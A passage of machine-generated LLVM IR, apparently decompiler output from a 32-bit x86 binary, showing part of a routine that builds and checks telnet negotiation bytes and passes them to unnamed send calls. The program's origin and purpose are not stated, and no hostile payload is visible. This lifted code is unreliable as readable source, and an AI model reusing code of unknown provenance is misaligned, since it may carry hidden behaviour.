  %v1_804e8fc = trunc i32 %v0_804e8fc to i8
  %v2_804e8fc = load i32, i32* @edi, align 4
  %v3_804e8fc = add i32 %v2_804e8fc, 284
  %v4_804e8fc = inttoptr i32 %v3_804e8fc to i8*
  store i8 %v1_804e8fc, i8* %v4_804e8fc, align 1
  %v0_804e902 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e902 = trunc i32 %v0_804e902 to i8
  %tmp307 = icmp ult i8 %v1_804e902, 10
  %v0_804ef8e = load i32, i32* @edi, align 4
  br i1 %tmp307, label %dec_label_pc_804ef8e, label %dec_label_pc_804e90a

dec_label_pc_804e90a:                             ; preds = %dec_label_pc_804e8df
  %v1_804e90a = add i32 %v0_804ef8e, 284
  %v2_804e90a = inttoptr i32 %v1_804e90a to i8*
  store i8 0, i8* %v2_804e90a, align 1
  %v0_804e911 = load i32, i32* @edi, align 4
  %v1_804e911 = add i32 %v0_804e911, 12
  %v2_804e911 = inttoptr i32 %v1_804e911 to i32*
  store i32 0, i32* %v2_804e911, align 4
  br label %dec_label_pc_804e3c2

dec_label_pc_804e920:                             ; preds = %dec_label_pc_804e4e0
  store i8 -4, i8* %v1_804e4e0, align 1
  br label %dec_label_pc_804e4f2

dec_label_pc_804e928:                             ; preds = %dec_label_pc_804e4c6
  %v1_804e928 = add i32 %v0_804e928, 1863
  %v2_804e928 = inttoptr i32 %v1_804e928 to i8*
  store i8 -1, i8* %v2_804e928, align 1
  %v0_804e930 = load i32, i32* @esp, align 4
  %v1_804e930 = add i32 %v0_804e930, 1864
  %v2_804e930 = inttoptr i32 %v1_804e930 to i8*
  store i8 -5, i8* %v2_804e930, align 1
  %v0_804e938 = load i32, i32* @esp, align 4
  %v1_804e938 = add i32 %v0_804e938, 1865
  %v2_804e938 = inttoptr i32 %v1_804e938 to i8*
  store i8 31, i8* %v2_804e938, align 1
  %v0_804e940 = load i32, i32* @esp, align 4
  %v1_804e940 = add i32 %v0_804e940, 1831
  %v2_804e940 = inttoptr i32 %v1_804e940 to i8*
  store i8 -1, i8* %v2_804e940, align 1
  %v0_804e948 = load i32, i32* @esp, align 4
  %v1_804e948 = add i32 %v0_804e948, 1832
  %v2_804e948 = inttoptr i32 %v1_804e948 to i8*
  store i8 -6, i8* %v2_804e948, align 1
  %v0_804e950 = load i32, i32* @esp, align 4
  %v1_804e950 = add i32 %v0_804e950, 1833
  %v2_804e950 = inttoptr i32 %v1_804e950 to i8*
  store i8 31, i8* %v2_804e950, align 1
  %v0_804e958 = load i32, i32* @esp, align 4
  %v1_804e958 = add i32 %v0_804e958, 1834
  %v2_804e958 = inttoptr i32 %v1_804e958 to i8*
  store i8 0, i8* %v2_804e958, align 1
  %v0_804e960 = load i32, i32* @esp, align 4
  %v1_804e960 = add i32 %v0_804e960, 1835
  %v2_804e960 = inttoptr i32 %v1_804e960 to i8*
  store i8 80, i8* %v2_804e960, align 1
  %v0_804e968 = load i32, i32* @esp, align 4
  %v1_804e968 = add i32 %v0_804e968, 1836
  %v2_804e968 = inttoptr i32 %v1_804e968 to i8*
  store i8 0, i8* %v2_804e968, align 1
  %v0_804e970 = load i32, i32* @esp, align 4
  %v1_804e970 = add i32 %v0_804e970, 1837
  %v2_804e970 = inttoptr i32 %v1_804e970 to i8*
  store i8 24, i8* %v2_804e970, align 1
  %v0_804e978 = load i32, i32* @esp, align 4
  %v1_804e978 = add i32 %v0_804e978, 1838
  %v2_804e978 = inttoptr i32 %v1_804e978 to i8*
  store i8 -1, i8* %v2_804e978, align 1
  %v0_804e980 = load i32, i32* @esp, align 4
  %v1_804e980 = add i32 %v0_804e980, 1839
  %v2_804e980 = inttoptr i32 %v1_804e980 to i8*
  store i8 -16, i8* %v2_804e980, align 1
  %v0_804e988 = load i32, i32* @esp, align 4
  %v1_804e988 = add i32 %v0_804e988, 8
  %v2_804e988 = inttoptr i32 %v1_804e988 to i32*
  %v3_804e988 = load i32, i32* %v2_804e988, align 4
  store i32 %v3_804e988, i32* %eax.global-to-local, align 4
  %v0_804e98c = load i32, i32* @edi, align 4
  %v1_804e98c = add i32 %v0_804e98c, 24
  %v2_804e98c = inttoptr i32 %v1_804e98c to i32*
  %v3_804e98c = load i32, i32* %v2_804e98c, align 4
  %v0_804e98f = load i32, i32* @ebx, align 4
  %v1_804e98f = add i32 %v0_804e98f, 2
  store i32 %v1_804e98f, i32* %edx.global-to-local, align 4
  %v2_804e992 = add i32 %v3_804e98c, %v3_804e988
  store i32 %v2_804e992, i32* %eax.global-to-local, align 4
  %tmp308 = icmp ugt i32 %v2_804e992, %v1_804e98f
  br i1 %tmp308, label %dec_label_pc_804e99c, label %dec_label_pc_804e928.dec_label_pc_804e526.loopexit_crit_edge

dec_label_pc_804e928.dec_label_pc_804e526.loopexit_crit_edge: ; preds = %dec_label_pc_804e928
  %v0_804e526.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e526

dec_label_pc_804e99c:                             ; preds = %dec_label_pc_804e928
  %v2_804e99c = inttoptr i32 %v1_804e98f to i8*
  %v3_804e99c = load i8, i8* %v2_804e99c, align 1
  %v12_804e99c = icmp eq i8 %v3_804e99c, 31
  br i1 %v12_804e99c, label %dec_label_pc_804efaa, label %dec_label_pc_804e9a6

dec_label_pc_804e9a6:                             ; preds = %dec_label_pc_804e99c
  %v1_804e9a6 = inttoptr i32 %v0_804e98f to i8*
  %v2_804e9a6 = load i8, i8* %v1_804e9a6, align 1
  %v3_804e9a6 = zext i8 %v2_804e9a6 to i32
  %v5_804e9a6 = and i32 %v2_804e992, -256
  %v6_804e9a6 = or i32 %v3_804e9a6, %v5_804e9a6
  store i32 %v6_804e9a6, i32* %eax.global-to-local, align 4
  %v11_804e9a8 = icmp eq i8 %v2_804e9a6, -3
  %v1_804e9aa = icmp eq i1 %v11_804e9a8, false
  br i1 %v1_804e9aa, label %dec_label_pc_804ef9a, label %dec_label_pc_804e9b0

dec_label_pc_804e9b0:                             ; preds = %dec_label_pc_804e9a6
  store i8 -4, i8* %v1_804e9a6, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804e9b8:                             ; preds = %dec_label_pc_804e4f2
  store i8 -3, i8* %v2_804e4f2, align 1
  br label %dec_label_pc_804e505

dec_label_pc_804e9c1:                             ; preds = %dec_label_pc_804e4e0
  store i8 -3, i8* %v1_804e4e0, align 1
  br label %dec_label_pc_804e4f2

dec_label_pc_804e9c9:                             ; preds = %dec_label_pc_804e42c
  %v0_804e9c9 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e9c9, i32* %edx.global-to-local, align 4
  %v1_804e9cb = load i32, i32* @esp, align 4
  %v2_804e9cb = add i32 %v1_804e9cb, -4
  %v3_804e9cb = inttoptr i32 %v2_804e9cb to i32*
  store i32 %v0_804e9c9, i32* %v3_804e9cb, align 4
  %v0_804e9cc = load i32, i32* @edi, align 4
  %v1_804e9cc = add i32 %v0_804e9cc, 92
  store i32 %v1_804e9cc, i32* %eax.global-to-local, align 4
  %v1_804e9cf = add i32 %v1_804e9cb, -8
  %v2_804e9cf = inttoptr i32 %v1_804e9cf to i32*
  store i32 192, i32* %v2_804e9cf, align 4
  %v0_804e9d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e9d4 = add i32 %v1_804e9cb, -12
  %v3_804e9d4 = inttoptr i32 %v2_804e9d4 to i32*
  store i32 %v0_804e9d4, i32* %v3_804e9d4, align 4
  %v0_804e9d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e9d5 = add i32 %v1_804e9cb, -16
  %v3_804e9d5 = inttoptr i32 %v2_804e9d5 to i32*
  store i32 %v0_804e9d5, i32* %v3_804e9d5, align 4
  %v4_804e9d6 = call i32 @function_8050245(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e9d6, i32* %eax.global-to-local, align 4
  %v0_804e9db = load i32, i32* @edi, align 4
  %v1_804e9db = add i32 %v0_804e9db, 24
  %v2_804e9db = inttoptr i32 %v1_804e9db to i32*
  %v3_804e9db = load i32, i32* %v2_804e9db, align 4
  %v1_804e9de = add i32 %v3_804e9db, -64
  store i32 %v1_804e9de, i32* %v2_804e9db, align 4
  br label %dec_label_pc_804e440

dec_label_pc_804e9ec:                             ; preds = %dec_label_pc_804e58c, %dec_label_pc_804e58c, %dec_label_pc_804e58c, %dec_label_pc_804e58c
  %v1_804e9ec = add i32 %v0_804e9ec, 1
  store i32 %v1_804e9ec, i32* @esi, align 4
  %v10_804e9ef = icmp eq i32 %v0_804e9ec, -2
  %v1_804e9f2 = icmp eq i1 %v10_804e9ef, false
  br i1 %v1_804e9f2, label %dec_label_pc_804ece2, label %dec_label_pc_804e9f8

dec_label_pc_804e9f8:                             ; preds = %dec_label_pc_804e5b4, %dec_label_pc_804e9ec, %dec_label_pc_804e580
  %v0_804e9f8 = load i32, i32* @esp, align 4
  %v1_804e9fb = add i32 %v0_804e9f8, -16
  %v2_804e9fb = inttoptr i32 %v1_804e9fb to i32*
  store i32 28, i32* %v2_804e9fb, align 4
  %v0_804e9fd = call i32 @function_804f160()
  store i32 %v0_804e9fd, i32* %eax.global-to-local, align 4
  %v0_804ea02 = load i32, i32* @esp, align 4
  %v1_804ea02 = inttoptr i32 %v0_804ea02 to i32*
  %v2_804ea02 = load i32, i32* %v1_804ea02, align 4
  store i32 %v2_804ea02, i32* %eax.global-to-local, align 4
  %v3_804ea02 = add i32 %v0_804ea02, 4
  %v1_804ea03 = inttoptr i32 %v3_804ea02 to i32*
  %v1_804ea04 = add i32 %v0_804ea02, 1864
  store i32 %v1_804ea04, i32* %edx.global-to-local, align 4
  store i32 %v1_804ea04, i32* %v1_804ea03, align 4
  store i32 28, i32* %v1_804ea02, align 4
  %v0_804ea0e = call i32 @function_804f0b0()
  store i32 %v0_804ea0e, i32* %eax.global-to-local, align 4
  %v0_804ea13 = load i32, i32* @esp, align 4
  %v1_804ea13 = add i32 %v0_804ea13, 1864
  %v2_804ea13 = inttoptr i32 %v1_804ea13 to i32*
  %v3_804ea13 = load i32, i32* %v2_804ea13, align 4
  %v1_804ea1a = add i32 %v3_804ea13, -1
  store i32 %v1_804ea1a, i32* %edx.global-to-local, align 4
  %v2_804ea1b = add i32 %v0_804ea13, -4
  %v3_804ea1b = inttoptr i32 %v2_804ea1b to i32*
  store i32 %v1_804ea1a, i32* %v3_804ea1b, align 4
  %v2_804ea1c = add i32 %v0_804ea13, -8
  %v3_804ea1c = inttoptr i32 %v2_804ea1c to i32*
  store i32 %v0_804ea0e, i32* %v3_804ea1c, align 4
  %v0_804ea1d = load i32, i32* @edi, align 4
  %v1_804ea1d = add i32 %v0_804ea1d, 24
  %v2_804ea1d = inttoptr i32 %v1_804ea1d to i32*
  %v3_804ea1d = load i32, i32* %v2_804ea1d, align 4
  store i32 %v3_804ea1d, i32* %eax.global-to-local, align 4
  %v2_804ea20 = add i32 %v0_804ea13, -12
  %v3_804ea20 = inttoptr i32 %v2_804ea20 to i32*
  store i32 %v3_804ea1d, i32* %v3_804ea20, align 4
  %v1_804ea21 = add i32 %v0_804ea13, 24
  %v2_804ea21 = inttoptr i32 %v1_804ea21 to i32*
  %v3_804ea21 = load i32, i32* %v2_804ea21, align 4
  store i32 %v3_804ea21, i32* %eax.global-to-local, align 4
  %v2_804ea25 = add i32 %v0_804ea13, -16
  %v3_804ea25 = inttoptr i32 %v2_804ea25 to i32*
  store i32 %v3_804ea21, i32* %v3_804ea25, align 4
  %v0_804ea26 = call i32 @function_804f870()
  %v0_804ea2b = load i32, i32* @esp, align 4
  %v8_804ea2e = icmp eq i32 %v0_804ea26, -1
  %v1_804ea2f = icmp eq i1 %v8_804ea2e, false
  %v2_804ea2f = zext i1 %v1_804ea2f to i32
  %v2_804ea32 = icmp eq i1 %v1_804ea2f, false
  store i32 %v2_804ea2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea2f, i32* @esi, align 4
  %v1_804efee = add i32 %v0_804ea2b, 16
  %v2_804efee = inttoptr i32 %v1_804efee to i32*
  store i32 28, i32* %v2_804efee, align 4
  %v0_804eff0 = call i32 @function_804f0e0()
  store i32 %v0_804eff0, i32* %eax.global-to-local, align 4
  br i1 %v2_804ea32, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ea41

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804e9f8
  %v0_804ea4e = load i32, i32* @esi, align 4
  %v10_804ea4e = icmp eq i32 %v0_804ea4e, -1
  br i1 %v10_804ea4e, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ea57

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804ea41, %dec_label_pc_804ece2
  %v0_804ea57 = phi i32 [ %v0_804ea4e, %dec_label_pc_804ea41 ], [ %v0_804ea57.pre, %dec_label_pc_804ece2 ]
  %v0_804ea5f.in = load i32, i32* @esp, align 4
  %tmp140 = icmp slt i32 %v0_804ea57, 1
  br i1 %tmp140, label %dec_label_pc_804ea99, label %dec_label_pc_804ea5b

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea57
  %v0_804ea5b = load i32, i32* @edi, align 4
  %v1_804ea5b = inttoptr i32 %v0_804ea5b to i32*
  %v2_804ea5b = load i32, i32* %v1_804ea5b, align 4
  store i32 %v2_804ea5b, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ea5f = add i32 %v0_804ea5f.in, 12
  %v2_804ea5f = inttoptr i32 %v1_804ea5f to i32*
  store i32 16384, i32* %v2_804ea5f, align 4
  %v0_804ea64 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea64 = add i32 %v0_804ea64, 13
  %v2_804ea64 = inttoptr i32 %v1_804ea64 to i8*
  %v3_804ea64 = load i8, i8* %v2_804ea64, align 1
  %v4_804ea64 = zext i8 %v3_804ea64 to i32
  %v5_804ea64 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ea64 = and i32 %v5_804ea64, -256
  %v7_804ea64 = or i32 %v6_804ea64, %v4_804ea64
  store i32 %v7_804ea64, i32* %eax.global-to-local, align 4
  %v2_804ea67 = add i32 %v0_804ea5f.in, 8
  %v3_804ea67 = inttoptr i32 %v2_804ea67 to i32*
  store i32 %v7_804ea64, i32* %v3_804ea67, align 4
  %v0_804ea68 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea68 = add i32 %v0_804ea68, 4
  %v2_804ea68 = inttoptr i32 %v1_804ea68 to i32*
  %v3_804ea68 = load i32, i32* %v2_804ea68, align 4
  %v2_804ea6b = add i32 %v0_804ea5f.in, 4
  %v3_804ea6b = inttoptr i32 %v2_804ea6b to i32*
  store i32 %v3_804ea68, i32* %v3_804ea6b, align 4
  %v0_804ea6c = load i32, i32* @edi, align 4
  %v1_804ea6c = add i32 %v0_804ea6c, 4
  %v2_804ea6c = inttoptr i32 %v1_804ea6c to i32*
  %v3_804ea6c = load i32, i32* %v2_804ea6c, align 4
  store i32 %v3_804ea6c, i32* @ebx, align 4
  %v3_804ea6f = inttoptr i32 %v0_804ea5f.in to i32*
  store i32 %v3_804ea6c, i32* %v3_804ea6f, align 4
  %v0_804ea70 = call i32 @function_8050441()
  store i32 %v0_804ea70, i32* %eax.global-to-local, align 4
  %v0_804ea75 = load i32, i32* @esp, align 4
  %v1_804ea75 = add i32 %v0_804ea75, -4
  %v2_804ea75 = inttoptr i32 %v1_804ea75 to i32*
  store i32 16384, i32* %v2_804ea75, align 4
  %v1_804ea7a = add i32 %v0_804ea75, -8
  %v2_804ea7a = inttoptr i32 %v1_804ea7a to i32*
  store i32 2, i32* %v2_804ea7a, align 4
  %v1_804ea7c = add i32 %v0_804ea75, -12
  %v2_804ea7c = inttoptr i32 %v1_804ea7c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804ea7c, align 4
  %v0_804ea81 = load i32, i32* @edi, align 4
  %v1_804ea81 = add i32 %v0_804ea81, 4
  %v2_804ea81 = inttoptr i32 %v1_804ea81 to i32*
  %v3_804ea81 = load i32, i32* %v2_804ea81, align 4
  store i32 %v3_804ea81, i32* %ecx.global-to-local, align 4
  %v2_804ea84 = add i32 %v0_804ea75, -16
  %v3_804ea84 = inttoptr i32 %v2_804ea84 to i32*
  store i32 %v3_804ea81, i32* %v3_804ea84, align 4
  %v0_804ea85 = call i32 @function_8050441()
  store i32 %v0_804ea85, i32* %eax.global-to-local, align 4
  %v0_804ea8d = load i32, i32* @edi, align 4
  %v1_804ea8d = add i32 %v0_804ea8d, 12
  %v2_804ea8d = inttoptr i32 %v1_804ea8d to i32*
  store i32 5, i32* %v2_804ea8d, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804e842, %dec_label_pc_804ed79, %dec_label_pc_804ec94, %dec_label_pc_804e69a, %dec_label_pc_804eab2, %dec_label_pc_804ed00, %dec_label_pc_804ea57, %dec_label_pc_804e526, %dec_label_pc_804ebdd
  %v0_804ea99 = phi i32 [ %v1_804e836179, %dec_label_pc_804e842 ], [ %v1_804ed6d, %dec_label_pc_804ed79 ], [ %v0_804ec8b, %dec_label_pc_804ec94 ], [ %v1_804e68e176, %dec_label_pc_804e69a ], [ %v1_804eaa6, %dec_label_pc_804eab2 ], [ %v1_804ecf4, %dec_label_pc_804ed00 ], [ %v0_804ea57, %dec_label_pc_804ea57 ], [ %v0_804e526, %dec_label_pc_804e526 ], [ %v0_804ebdd, %dec_label_pc_804ebdd ]
  %v1_804ea99 = icmp eq i32 %v0_804ea99, 0
  %v1_804ea9b = icmp eq i1 %v1_804ea99, false
  br i1 %v1_804ea9b, label %dec_label_pc_804e788, label %dec_label_pc_804e425.backedge

dec_label_pc_804eaa6:                             ; preds = %dec_label_pc_804e611, %dec_label_pc_804e611, %dec_label_pc_804e611, %dec_label_pc_804e611, %dec_label_pc_804e611
  %v1_804eaa6 = add i32 %v0_804eaa6, 1
  store i32 %v1_804eaa6, i32* @esi, align 4
  %v10_804eaa9 = icmp eq i32 %v0_804eaa6, -2
  br i1 %v10_804eaa9, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804eab2

dec_label_pc_804eab2:                             ; preds = %dec_label_pc_804eaa6
  %tmp141 = icmp slt i32 %v1_804eaa6, 1
  br i1 %tmp141, label %dec_label_pc_804ea99, label %dec_label_pc_804eab6

dec_label_pc_804eab6:                             ; preds = %dec_label_pc_804eab2
  %v0_804eab6 = load i32, i32* @esp, align 4
  %v1_804eab9 = add i32 %v0_804eab6, -16
  %v2_804eab9 = inttoptr i32 %v1_804eab9 to i32*
  store i32 9, i32* %v2_804eab9, align 4
  %v0_804eabb = call i32 @function_804f160()
  store i32 %v0_804eabb, i32* %eax.global-to-local, align 4
  %v0_804eac0 = load i32, i32* @esp, align 4
  %v1_804eac0 = inttoptr i32 %v0_804eac0 to i32*
  %v2_804eac0 = load i32, i32* %v1_804eac0, align 4
  store i32 %v2_804eac0, i32* %eax.global-to-local, align 4
  %v3_804eac0 = add i32 %v0_804eac0, 4
  %v1_804eac1 = inttoptr i32 %v3_804eac0 to i32*
  %v2_804eac1 = load i32, i32* %v1_804eac1, align 4
  store i32 %v2_804eac1, i32* %edx.global-to-local, align 4
  %v1_804eac2 = add i32 %v0_804eac0, 1864
  store i32 %v1_804eac2, i32* %eax.global-to-local, align 4
  store i32 %v1_804eac2, i32* %v1_804eac1, align 4
  store i32 9, i32* %v1_804eac0, align 4
  %v0_804eacc = call i32 @function_804f0b0()
  store i32 %v0_804eacc, i32* %eax.global-to-local, align 4
  %v0_804ead1 = load i32, i32* @esp, align 4
  %v1_804ead1 = add i32 %v0_804ead1, -4
  %v2_804ead1 = inttoptr i32 %v1_804ead1 to i32*
  store i32 16384, i32* %v2_804ead1, align 4
  %v1_804ead6 = add i32 %v0_804ead1, 1864
  %v2_804ead6 = inttoptr i32 %v1_804ead6 to i32*
  %v3_804ead6 = load i32, i32* %v2_804ead6, align 4
  %v2_804eadd = add i32 %v0_804ead1, -8
  %v3_804eadd = inttoptr i32 %v2_804eadd to i32*
  store i32 %v3_804ead6, i32* %v3_804eadd, align 4
  %v2_804eade = add i32 %v0_804ead1, -12
  %v3_804eade = inttoptr i32 %v2_804eade to i32*
  store i32 %v0_804eacc, i32* %v3_804eade, align 4
  %v0_804eadf = load i32, i32* @edi, align 4
  %v1_804eadf = add i32 %v0_804eadf, 4
  %v2_804eadf = inttoptr i32 %v1_804eadf to i32*
  %v3_804eadf = load i32, i32* %v2_804eadf, align 4
  store i32 %v3_804eadf, i32* @ebx, align 4
  %v2_804eae2 = add i32 %v0_804ead1, -16
  %v3_804eae2 = inttoptr i32 %v2_804eae2 to i32*
  store i32 %v3_804eadf, i32* %v3_804eae2, align 4
  %v0_804eae3 = call i32 @function_8050441()
  store i32 %v0_804eae3, i32* %eax.global-to-local, align 4
  %v0_804eae8 = load i32, i32* @esp, align 4
  %v1_804eaeb = add i32 %v0_804eae8, 28
  %v2_804eaeb = inttoptr i32 %v1_804eaeb to i32*
  store i32 16384, i32* %v2_804eaeb, align 4
  %v1_804eaf0 = add i32 %v0_804eae8, 24
  %v2_804eaf0 = inttoptr i32 %v1_804eaf0 to i32*
  store i32 2, i32* %v2_804eaf0, align 4
  %v1_804eaf2 = add i32 %v0_804eae8, 20
  %v2_804eaf2 = inttoptr i32 %v1_804eaf2 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804eaf2, align 4
  %v0_804eaf7 = load i32, i32* @edi, align 4
  %v1_804eaf7 = add i32 %v0_804eaf7, 4
  %v2_804eaf7 = inttoptr i32 %v1_804eaf7 to i32*
  %v3_804eaf7 = load i32, i32* %v2_804eaf7, align 4
  store i32 %v3_804eaf7, i32* %ecx.global-to-local, align 4
  %v2_804eafa = add i32 %v0_804eae8, 16
  %v3_804eafa = inttoptr i32 %v2_804eafa to i32*
  store i32 %v3_804eaf7, i32* %v3_804eafa, align 4
  %v0_804eafb = call i32 @function_8050441()
  store i32 %v0_804eafb, i32* %eax.global-to-local, align 4
  %v0_804eb00 = load i32, i32* @esp, align 4
  %v1_804eb00 = inttoptr i32 %v0_804eb00 to i32*
  store i32 9, i32* %v1_804eb00, align 4
  %v0_804eb07 = call i32 @function_804f0e0()
  store i32 %v0_804eb07, i32* %eax.global-to-local, align 4
  %v0_804eb0f = load i32, i32* @edi, align 4
  %v1_804eb0f = add i32 %v0_804eb0f, 12
  %v2_804eb0f = inttoptr i32 %v1_804eb0f to i32*
  store i32 9, i32* %v2_804eb0f, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804eb1b:                             ; preds = %dec_label_pc_804e546, %dec_label_pc_804e546, %dec_label_pc_804e546, %dec_label_pc_804e546, %dec_label_pc_804e546
  %v1_804eb1b = add i32 %v0_804eb1b, 1
  store i32 %v1_804eb1b, i32* @esi, align 4
  %v10_804eb1e = icmp eq i32 %v0_804eb1b, -2
  %v1_804eb21 = icmp eq i1 %v10_804eb1e, false
  br i1 %v1_804eb21, label %dec_label_pc_804ec22, label %dec_label_pc_804eb27

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804e577, %dec_label_pc_804eb1b, %dec_label_pc_804e53a
  %v0_804eb27 = load i32, i32* @esp, align 4
  %v1_804eb2a = add i32 %v0_804eb27, -16
  %v2_804eb2a = inttoptr i32 %v1_804eb2a to i32*
  store i32 29, i32* %v2_804eb2a, align 4
  %v0_804eb2c = call i32 @function_804f160()
  store i32 %v0_804eb2c, i32* %eax.global-to-local, align 4
  %v0_804eb31 = load i32, i32* @esp, align 4
  %v1_804eb31 = inttoptr i32 %v0_804eb31 to i32*
  store i32 30, i32* %v1_804eb31, align 4
  %v0_804eb38 = call i32 @function_804f160()
  store i32 %v0_804eb38, i32* %eax.global-to-local, align 4
  %v0_804eb3d = load i32, i32* @esp, align 4
  %v1_804eb3d = inttoptr i32 %v0_804eb3d to i32*
  %v2_804eb3d = load i32, i32* %v1_804eb3d, align 4
  store i32 %v2_804eb3d, i32* %ecx.global-to-local, align 4
  %v3_804eb3d = add i32 %v0_804eb3d, 4
  %v1_804eb3e = inttoptr i32 %v3_804eb3d to i32*
  %v2_804eb3e = load i32, i32* %v1_804eb3e, align 4
  store i32 %v2_804eb3e, i32* %ebx.global-to-local, align 4
  %v1_804eb3f = add i32 %v0_804eb3d, 1864
  store i32 %v1_804eb3f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804eb3f, i32* %v1_804eb3e, align 4
  store i32 29, i32* %v1_804eb3d, align 4
  %v0_804eb49 = call i32 @function_804f0b0()
  store i32 %v0_804eb49, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb49, i32* @ebx, align 4
  %v0_804eb50 = load i32, i32* @esp, align 4
  %v1_804eb50 = inttoptr i32 %v0_804eb50 to i32*
  %v2_804eb50 = load i32, i32* %v1_804eb50, align 4
  store i32 %v2_804eb50, i32* %eax.global-to-local, align 4
  %v3_804eb50 = add i32 %v0_804eb50, 4
  %v1_804eb51 = inttoptr i32 %v3_804eb50 to i32*
  %v2_804eb51 = load i32, i32* %v1_804eb51, align 4
  store i32 %v2_804eb51, i32* %edx.global-to-local, align 4
  %v1_804eb52 = add i32 %v0_804eb50, 1864
  store i32 %v1_804eb52, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb52, i32* %v1_804eb51, align 4
  store i32 30, i32* %v1_804eb50, align 4
  %v0_804eb5c = call i32 @function_804f0b0()
  store i32 %v0_804eb5c, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb5c, i32* @ebp, align 4
  %v0_804eb63 = load i32, i32* @esp, align 4
  %v1_804eb63 = add i32 %v0_804eb63, 1864
  %v2_804eb63 = inttoptr i32 %v1_804eb63 to i32*
  %v3_804eb63 = load i32, i32* %v2_804eb63, align 4
  %v1_804eb6a = add i32 %v3_804eb63, -1
  store i32 %v1_804eb6a, i32* %eax.global-to-local, align 4
  %v2_804eb6b = add i32 %v0_804eb63, -4
  %v3_804eb6b = inttoptr i32 %v2_804eb6b to i32*
  store i32 %v1_804eb6a, i32* %v3_804eb6b, align 4
  %v0_804eb6c = load i32, i32* @ebx, align 4
  %v2_804eb6c = add i32 %v0_804eb63, -8
  %v3_804eb6c = inttoptr i32 %v2_804eb6c to i32*
  store i32 %v0_804eb6c, i32* %v3_804eb6c, align 4
  %v0_804eb6d = load i32, i32* @edi, align 4
  %v1_804eb6d = add i32 %v0_804eb6d, 24
  %v2_804eb6d = inttoptr i32 %v1_804eb6d to i32*
  %v3_804eb6d = load i32, i32* %v2_804eb6d, align 4
  store i32 %v3_804eb6d, i32* %eax.global-to-local, align 4
  %v2_804eb70 = add i32 %v0_804eb63, -12
  %v3_804eb70 = inttoptr i32 %v2_804eb70 to i32*
  store i32 %v3_804eb6d, i32* %v3_804eb70, align 4
  %v1_804eb71 = add i32 %v0_804eb63, 24
  %v2_804eb71 = inttoptr i32 %v1_804eb71 to i32*
  %v3_804eb71 = load i32, i32* %v2_804eb71, align 4
  store i32 %v3_804eb71, i32* %eax.global-to-local, align 4
  %v2_804eb75 = add i32 %v0_804eb63, -16
  %v3_804eb75 = inttoptr i32 %v2_804eb75 to i32*
  store i32 %v3_804eb71, i32* %v3_804eb75, align 4
  %v0_804eb76 = call i32 @function_804f870()
  %v0_804eb7b = load i32, i32* @esp, align 4
  %v1_804eb7b = add i32 %v0_804eb7b, 32
  %v8_804eb7e = icmp eq i32 %v0_804eb76, -1
  %v1_804eb7f = icmp eq i1 %v8_804eb7e, false
  %v2_804eb7f = zext i1 %v1_804eb7f to i32
  %v2_804eb82 = icmp eq i1 %v1_804eb7f, false
  store i32 %v2_804eb7f, i32* %eax.global-to-local, align 4
  store i32 %v2_804eb7f, i32* @esi, align 4
  %v1_804eb8b = icmp eq i1 %v2_804eb82, false
  br i1 %v1_804eb8b, label %dec_label_pc_804ebbb, label %dec_label_pc_804eb8d

dec_label_pc_804eb8d:                             ; preds = %dec_label_pc_804eb27
  %v1_804eb8d = add i32 %v0_804eb7b, 1880
  %v2_804eb8d = inttoptr i32 %v1_804eb8d to i32*
  %v3_804eb8d = load i32, i32* %v2_804eb8d, align 4
  %v1_804eb94 = add i32 %v3_804eb8d, -1
  store i32 %v1_804eb94, i32* %eax.global-to-local, align 4
  %v2_804eb95 = add i32 %v0_804eb7b, 28
  %v3_804eb95 = inttoptr i32 %v2_804eb95 to i32*
  store i32 %v1_804eb94, i32* %v3_804eb95, align 4
  %v0_804eb96 = load i32, i32* @ebp, align 4
  %v2_804eb96 = add i32 %v0_804eb7b, 24
  %v3_804eb96 = inttoptr i32 %v2_804eb96 to i32*
  store i32 %v0_804eb96, i32* %v3_804eb96, align 4
  %v0_804eb97 = load i32, i32* @edi, align 4
  %v1_804eb97 = add i32 %v0_804eb97, 24
  %v2_804eb97 = inttoptr i32 %v1_804eb97 to i32*
  %v3_804eb97 = load i32, i32* %v2_804eb97, align 4
  store i32 %v3_804eb97, i32* %eax.global-to-local, align 4
  %v2_804eb9a = add i32 %v0_804eb7b, 20
  %v3_804eb9a = inttoptr i32 %v2_804eb9a to i32*
  store i32 %v3_804eb97, i32* %v3_804eb9a, align 4
  %v1_804eb9b = add i32 %v0_804eb7b, 40
  %v2_804eb9b = inttoptr i32 %v1_804eb9b to i32*
  %v3_804eb9b = load i32, i32* %v2_804eb9b, align 4
  store i32 %v3_804eb9b, i32* %eax.global-to-local, align 4
  %v2_804eb9f = add i32 %v0_804eb7b, 16
  %v3_804eb9f = inttoptr i32 %v2_804eb9f to i32*
  store i32 %v3_804eb9b, i32* %v3_804eb9f, align 4
  %v0_804eba0 = call i32 @function_804f870()
  %v0_804eba5 = load i32, i32* @esp, align 4
  %v1_804eba5 = add i32 %v0_804eba5, 16
